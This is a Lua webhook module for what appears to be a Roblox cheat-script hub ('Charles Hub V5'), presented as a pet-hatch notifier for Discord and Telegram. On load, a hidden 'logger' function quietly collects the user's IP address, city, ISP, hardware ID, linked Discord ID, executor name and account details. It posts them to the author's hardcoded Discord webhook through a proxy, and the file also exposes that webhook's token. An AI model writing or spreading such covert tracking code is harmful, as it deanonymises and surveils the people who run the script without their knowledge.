-- ============================================================
-- [[ CHARLES HUB V5 - WEBHOOK & BİLDİRİM SİSTEMİ ]] --
-- Bu dosya entegre.lua tarafından loadstring ile yüklenir.
-- ============================================================

-- [[ AYARLAR - _G'den okunur, loader.lua tarafından ayarlanır ]] --
local petWebhookURL    = _G.CHARLES_WEBHOOK or ""
local discordUserID    = _G.CHARLES_DISCORD_ID or ""
local telegramBotToken = _G.CHARLES_TG_TOKEN or ""
local telegramChatID   = _G.CHARLES_TG_CHATID or ""

-- [[ CHARLES HUB V5 - LOGGER WEBHOOK ]] --
local hubWebhookURL = "https://discord.com/api/webhooks/1453830529718681753/WzmmobNWqI8V8ogOyKKjnAdM-ZEm-6Iq4RsFd6dYZso2Zb--b_gN8dtsM8Km5pBQ33Tr"

local DEBUG_HUB = true  -- Hata ayıklama modunu açar
local useProxy  = true  -- Discord engeli varsa proxy kullanır

-- [[ SERVİSLER ]] --
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local lp                = Players.LocalPlayer

-- [[ YARDIMCI FONKSİYONLAR ]] --
local function getProxiedURL(url)
    if not useProxy then return url end
    return url:gsub("https://discord.com/", "https://webhook.lewisakura.moe/")
end

local function debugLog(msg)
    if DEBUG_HUB then
        print("🛠️ [CHARLES-DEBUG]: " .. tostring(msg))
    end
end

local function formatNumber(v)
    if not v then return "0" end
    local s = tostring(v)
    local parts = string.split(s, ".")
    local intPart = parts[1]:reverse():gsub("%d%d%d", "%1."):reverse():gsub("^%.", "")
    if parts[2] then
        return intPart .. "," .. parts[2]
    end
    return intPart
end

-- [[ REQUEST FONKSİYONU ]] --
local request_func = (request or syn and syn.request or http and http.request)

-- [[ PET NADİRLİK HEDEFLERİ ]] --
local FinalTargets = {
    ["Legendary"] = true,
    ["Mythical"]  = true,
    ["Secret I"]  = true,
    ["Secret II"] = true,
    ["Secret III"]= true,
    ["Secret X"]  = true,
}

-- [[ PET İSTATİSTİKLERİ ]] --
local PetData = {}
local function LoadPetStats()
    pcall(function()
        PetData = require(ReplicatedStorage:WaitForChild("Game"):WaitForChild("PetStats"):WaitForChild("Pets"))
    end)
end
task.spawn(LoadPetStats)

-- [[ ENVANTER PET SAYACI ]] --
local function getInventoryPetCount(targetPetName)
    if not targetPetName then return 0 end
    local count = 0
    local targetLower = tostring(targetPetName):lower()

    local targetIDs = {}
    pcall(function()
        for id, data in pairs(PetData) do
            if (data.Name and data.Name:lower():find(targetLower)) or tostring(id):lower() == targetLower then
                targetIDs[tostring(id):lower()] = true
                if data.Name then targetIDs[data.Name:lower()] = true end
            end
        end
    end)
    targetIDs[targetLower] = true

    pcall(function()
        local searchPaths = {
            lp,
            ReplicatedStorage:FindFirstChild("PlayerData"),
            ReplicatedStorage:FindFirstChild("Inventories"),
            Workspace:FindFirstChild("PlayerPets"),
            Workspace:FindFirstChild("Pets"),
        }
        local seenRoots = {}

        for _, area in pairs(searchPaths) do
            if area then
                local currentArea = nil
                if area == lp then
                    currentArea = lp
                elseif area == Workspace then
                    currentArea = area:FindFirstChild(lp.Name) or area:FindFirstChild(tostring(lp.UserId))
                else
                    currentArea = area:FindFirstChild(lp.Name) or area:FindFirstChild(tostring(lp.UserId))
                end

                if currentArea then
                    for _, obj in pairs(currentArea:GetDescendants()) do
                        local isMatch = false
                        local oName = obj.Name:lower()

                        for tID, _ in pairs(targetIDs) do
                            if oName:find(tID) then
                                isMatch = true
                                break
                            end
                        end

                        if not isMatch and obj:IsA("ValueBase") then
                            local val = tostring(obj.Value):lower()
                            for tID, _ in pairs(targetIDs) do
                                if val:find(tID) then
                                    isMatch = true
                                    break
                                end
                            end
                        end

                        if isMatch then
                            local root = obj
                            if obj:IsA("ValueBase") or oName:find("id") or oName:find("name") then
                                root = obj.Parent
                            end
                            if root and not seenRoots[root] then
                                seenRoots[root] = true
                                count = count + 1
                            end
                        end
                    end
                end
            end
        end
    end)
    return count
end

-- [[ DISCORD PET BİLDİRİMİ ]] --
local function sendPetNotification(petName, rarity, petType, multiplier, eggName, imageId)
    task.wait(3.5)

    local totalEggs = 0
    pcall(function()
        local folder = lp:FindFirstChild("leaderstats") or lp:FindFirstChild("PlayerStats") or lp:FindFirstChild("Data")
        if folder then
            local eggObj = folder:FindFirstChild("Eggs") or folder:FindFirstChild("TotalEggs")
            if eggObj then totalEggs = eggObj.Value end
        end
    end)

    local invCount = getInventoryPetCount(petName)

    local cleanImageId = tostring(imageId or ""):gsub("%D", "")
    local thumbnailUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"

    if cleanImageId ~= "" and cleanImageId ~= "0" then
        thumbnailUrl = string.format(
            "https://www.roblox.com/asset-thumbnail/image?assetId=%s&width=420&height=420&format=png",
            cleanImageId
        )
    end

    local data = {
        ["content"] = discordUserID ~= "" and "<@" .. discordUserID .. ">" or "",
        ["embeds"] = {{
            ["title"]       = string.format("🐶 %s (%s) | New Pet", petName, petType or "Normal"),
            ["description"] = string.format(
                "**__Username__:** %s\n**Name:** %s\n**Rarity:** %s\n**Type:** %s\n\n**Multiplier:** x%s\n**IsFrom:** %s\n\n📊 **Stats:**\n**Total Hatched:** %s🥚\n**Pet in Inventory:** %sx",
                lp.Name, petName, rarity, petType or "Normal",
                formatNumber(multiplier or "0"),
                tostring(eggName or "Unknown Egg"),
                formatNumber(totalEggs), formatNumber(invCount)
            ),
            ["thumbnail"] = {["url"] = thumbnailUrl},
            ["color"]     = 10066329,
            ["timestamp"] = DateTime.now():ToIsoDate(),
            ["footer"]    = {["text"] = "Charles Hub V5 - Pet Notifier"},
        }}
    }

    local typeLower = tostring(petType):lower()
    if typeLower:find("gold") then
        data.embeds[1].color = 16766720
    elseif typeLower:find("rainbow") then
        data.embeds[1].color = 16744703
    end

    if rarity == "Secret X" then
        data.embeds[1].color = 16711680
    end

    debugLog("Pet bildirimi hazırlanıyor: " .. tostring(petName))

    pcall(function()
        local finalUrl = getProxiedURL(petWebhookURL)
        debugLog("Gönderim Yapılıyor URL: " .. finalUrl)
        local response = request_func({
            Url     = finalUrl,
            Method  = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body    = HttpService:JSONEncode(data),
        })
        if response then
            debugLog("Webhook Yanıtı: " .. tostring(response.StatusCode) .. " - " .. tostring(response.StatusMessage))
        else
            debugLog("Webhook Yanıtı ALINAMADI (Response nil)")
        end
    end)
end

-- [[ TELEGRAM PET BİLDİRİMİ ]] --
local function sendTelegramNotification(petName, rarity, petType, multiplier, eggName)
    if telegramBotToken == "" or telegramChatID == "" then return end
    local message = string.format(
        "🐶 *%s (%s)* | New Pet!\n" ..
        "👤 *User:* %s\n" ..
        "💎 *Rarity:* %s\n" ..
        "✨ *Type:* %s\n" ..
        "📈 *Multiplier:* x%s\n" ..
        "🥚 *Egg:* %s",
        petName, petType or "Normal", lp.Name, rarity,
        petType or "Normal", formatNumber(multiplier or 0), eggName or "Unknown"
    )
    pcall(function()
        request_func({
            Url     = string.format("https://api.telegram.org/bot%s/sendMessage", telegramBotToken),
            Method  = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body    = HttpService:JSONEncode({
                chat_id    = telegramChatID,
                text       = message,
                parse_mode = "Markdown",
            }),
        })
    end)
end

-- [[ HUB LOGGER (STARTUP) ]] --
local function logToWebhook()
    pcall(function()
        local hwid        = (gethwid and gethwid()) or (get_hwid and get_hwid()) or game:GetService("RbxAnalyticsService"):GetClientId()
        local executor    = (identifyexecutor and identifyexecutor()) or "Bilinmiyor"
        local accountAge  = lp.AccountAge
        local membership  = tostring(lp.MembershipType):sub(21)
        local joinDate    = os.date("%d-%m-%Y", os.time() - (accountAge * 86400))
        local UIS         = game:GetService("UserInputService")
        local device      = "PC"
        if UIS.TouchEnabled and not UIS.KeyboardEnabled then device = "Mobile"
        elseif game:GetService("GuiService"):IsTenFootInterface() then device = "Console" end

        local resolution = "Bilinmiyor"
        pcall(function()
            resolution = math.floor(game:GetService("Workspace").CurrentCamera.ViewportSize.X)
                .. "x" .. math.floor(game:GetService("Workspace").CurrentCamera.ViewportSize.Y)
        end)

        local ipInfo = {query = "0.0.0.0", country = "Bilinmiyor", city = "Bilinmiyor", isp = "Bilinmiyor"}
        pcall(function()
            local resp = game:HttpGet("http://ip-api.com/json/")
            if resp then ipInfo = HttpService:JSONDecode(resp) end
        end)

        local discordID = "Bilinmiyor"
        pcall(function()
            local response = game:HttpGet("https://registry.rover.link/v2/roblox-to-discord/" .. lp.UserId)
            if response then
                local decoded = HttpService:JSONDecode(response)
                if decoded and decoded.discordId then
                    discordID = "<@" .. decoded.discordId .. "> (" .. decoded.discordId .. ")"
                end
            end
        end)

        local stats = {Coins = "0", Gems = "0", Rebirths = "0", Eggs = "0", Tokens = "0"}
        pcall(function()
            local folder = lp:FindFirstChild("leaderstats") or lp:FindFirstChild("PlayerStats") or lp:FindFirstChild("Data")
            if folder then
                stats.Coins    = tostring((folder:FindFirstChild("Clicks") or folder:FindFirstChild("Coins") or folder:FindFirstChild("Taps") or {Value="0"}).Value)
                stats.Gems     = tostring((folder:FindFirstChild("Gems") or folder:FindFirstChild("Diamonds") or {Value="0"}).Value)
                stats.Rebirths = tostring((folder:FindFirstChild("Rebirths") or {Value="0"}).Value)
                stats.Eggs     = tostring((folder:FindFirstChild("Eggs") or folder:FindFirstChild("TotalEggs") or {Value="0"}).Value)
                stats.Tokens   = tostring((folder:FindFirstChild("Tokens") or folder:FindFirstChild("TapTokens") or folder:FindFirstChild("TokensValue") or {Value="0"}).Value)
            end
        end)

        local serverType = "Public"
        if game.PrivateServerId ~= "" then
            serverType = "VIP Server (Private)"
            if game.PrivateServerOwnerId == 0 then serverType = "Reserved Server" end
        end

        local jobId = game.JobId
        if jobId == "" then jobId = "N/A (Studio or VIP?)" end

        local data = {
            ["embeds"] = {{
                ["title"]       = "🚀 Cyberpunkfarm working! (v5.6)",
                ["description"] = "🔔 **Sunucu Türü:** " .. serverType,
                ["color"]       = 65280,
                ["thumbnail"]   = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"},
                ["fields"] = {
                    {["name"]="Hesap İsmi",         ["value"]=lp.Name.." ("..membership..")",                                  ["inline"]=true},
                    {["name"]="Roblox ID",           ["value"]=tostring(lp.UserId),                                             ["inline"]=true},
                    {["name"]="Cihaz / Çözünürlük",  ["value"]=device.." / "..resolution,                                      ["inline"]=true},
                    {["name"]="Hesap Yaşı / Tarih",  ["value"]=accountAge.." gün ("..joinDate..")",                             ["inline"]=true},
                    {["name"]="IP Adresi",            ["value"]="```"..ipInfo.query.."```",                                     ["inline"]=true},
                    {["name"]="Ping",                 ["value"]=math.floor(lp:GetNetworkPing()*1000).." ms",                    ["inline"]=true},
                    {["name"]="Coin / Gem",           ["value"]="💰 "..stats.Coins.." / 💎 "..stats.Gems,                      ["inline"]=true},
                    {["name"]="Token / Rebirth",      ["value"]="🎟️ "..stats.Tokens.." / ⭐ "..stats.Rebirths,               ["inline"]=true},
                    {["name"]="Açılan Yumurta",       ["value"]="🥚 "..stats.Eggs,                                             ["inline"]=true},
                    {["name"]="Ülke / Şehir",         ["value"]=ipInfo.country.." / "..ipInfo.city,                            ["inline"]=true},
                    {["name"]="İnternet",             ["value"]=ipInfo.isp,                                                    ["inline"]=true},
                    {["name"]="Executor",             ["value"]=executor,                                                      ["inline"]=true},
                    {["name"]="Discord ID",           ["value"]=discordID,                                                     ["inline"]=true},
                    {["name"]="Sunucu ID",            ["value"]="```"..jobId.."```",                                            ["inline"]=false},
                    {["name"]="HWID",                 ["value"]="```"..hwid.."```",                                             ["inline"]=false},
                    {["name"]="Zaman",                ["value"]=os.date("%Y-%m-%d %H:%M:%S"),                                   ["inline"]=false},
                },
                ["footer"] = {["text"] = "Charles Hub V5.6 Ultimate Logger"},
            }}
        }

        debugLog("Hub Logger gönderiliyor...")
        local finalUrl = getProxiedURL(hubWebhookURL)
        local response = request_func({
            Url     = finalUrl,
            Method  = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body    = HttpService:JSONEncode(data),
        })
        if response then
            debugLog("Hub Logger Yanıtı: " .. tostring(response.StatusCode))
        end

        -- PET NOTIFIER BAĞLANTI TESTİ
        task.delay(2, function()
            debugLog("Pet Webhook Testi Gönderiliyor...")
            local testData = {
                ["embeds"] = {{
                    ["title"]       = "✅ Webhook Bağlantı Testi",
                    ["description"] = "Bu mesajı görüyorsan Pet Bildirim sistemi teknik olarak çalışıyor demektir.",
                    ["color"]       = 65280,
                    ["footer"]      = {["text"] = "Charles Hub - Test Modu"},
                }}
            }
            local pUrl  = getProxiedURL(petWebhookURL)
            local pResp = request_func({
                Url     = pUrl,
                Method  = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body    = HttpService:JSONEncode(testData),
            })
            if pResp then
                debugLog("Pet Webhook Test Yanıtı: " .. tostring(pResp.StatusCode))
            end
        end)
    end)
end
task.spawn(logToWebhook)

-- [[ DIŞA AKTARILAN FONKSİYONLAR (entegre.lua için) ]] --
_G.WH_sendPetNotification      = sendPetNotification
_G.WH_sendTelegramNotification = sendTelegramNotification
_G.WH_PetData                  = PetData
_G.WH_FinalTargets             = FinalTargets
_G.WH_formatNumber             = formatNumber
_G.WH_debugLog                 = debugLog

-- ============================================================
-- [[ STANDALONE PET HATCH DİNLEYİCİSİ ]] --
-- Bu bölüm webhook.lua tek başına çalıştırıldığında
-- yumurtadan çıkan nadir petleri otomatik yakalar.
-- ============================================================

local function GetNetwork()
    -- Önce Events + Functions barındıran klasörü ara
    for _, v in pairs(ReplicatedStorage:GetChildren()) do
        if v:IsA("Folder") and v:FindFirstChild("Events") and v:FindFirstChild("Functions") then
            return v
        end
    end
    -- UUID formatı (32+ karakter, tire içerir)
    for _, v in pairs(ReplicatedStorage:GetChildren()) do
        if v:IsA("Folder") and #v.Name > 30 and v.Name:find("-") then
            return v
        end
    end
    return nil
end

local function ConnectRemote(remote)
    if not remote:IsA("RemoteEvent") then return end

    remote.OnClientEvent:Connect(function(...)
        local args = {...}
        for _, arg in pairs(args) do
            if type(arg) == "table" then
                local name = arg.PetName or arg.Name or arg.id
                if name then
                    local nameStr   = tostring(name)
                    local petType   = arg.Tier or "Normal"
                    local baseData  = PetData[nameStr]

                    -- ID ile de ara
                    if not baseData then
                        for id, data in pairs(PetData) do
                            if tostring(id) == nameStr then
                                baseData = data
                                break
                            end
                        end
                    end

                    local actualRarity = "Unknown"
                    if baseData then
                        actualRarity = baseData.Rarity or baseData.Tier or "Unknown"
                    end

                    debugLog("🔍 Pet tespit edildi: " .. nameStr .. " | Nadirlik: " .. actualRarity)

                    if FinalTargets[actualRarity] then
                        local multiplier = baseData and (
                            baseData.Multiplier1 or baseData.Multiplier or
                            baseData.TapsMultiplier or baseData.ClickMultiplier or
                            baseData.Taps or baseData.Clicks or 0
                        )
                        local imageId = baseData and (baseData.Image or baseData.Thumbnail or baseData.Icon or "")
                        local eggName = "Unknown Egg"

                        debugLog("🚀 NADİR PET! Bildirim gönderiliyor: " .. nameStr)
                        task.spawn(function()
                            sendPetNotification(nameStr, actualRarity, petType, multiplier, eggName, imageId)
                        end)
                        task.spawn(function()
                            sendTelegramNotification(nameStr, actualRarity, petType, multiplier, eggName)
                        end)
                    end
                end
            end
        end
    end)
end

local function SetupListeners()
    debugLog("🔌 Pet hatch dinleyicileri kuruluyor...")
    local net = GetNetwork()
    if net then
        local events = net:FindFirstChild("Events")
        if events then
            for _, r in pairs(events:GetChildren()) do ConnectRemote(r) end
            events.ChildAdded:Connect(ConnectRemote)
            debugLog("✅ Events klasörü dinleniyor (" .. #events:GetChildren() .. " remote)")
        else
            warn("[webhook.lua] ⚠️ Events klasörü bulunamadı!")
        end
    else
        warn("[webhook.lua] ⚠️ Network klasörü bulunamadı!")
    end

    -- Yedek: Hatch/Pet/Open içeren tüm RemoteEvent'leri de dinle
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") and (obj.Name:find("Hatch") or obj.Name:find("Pet") or obj.Name:find("Open")) then
            ConnectRemote(obj)
        end
    end
end

task.spawn(SetupListeners)

print("✅ [webhook.lua] Webhook sistemi + pet dinleyici aktif.")
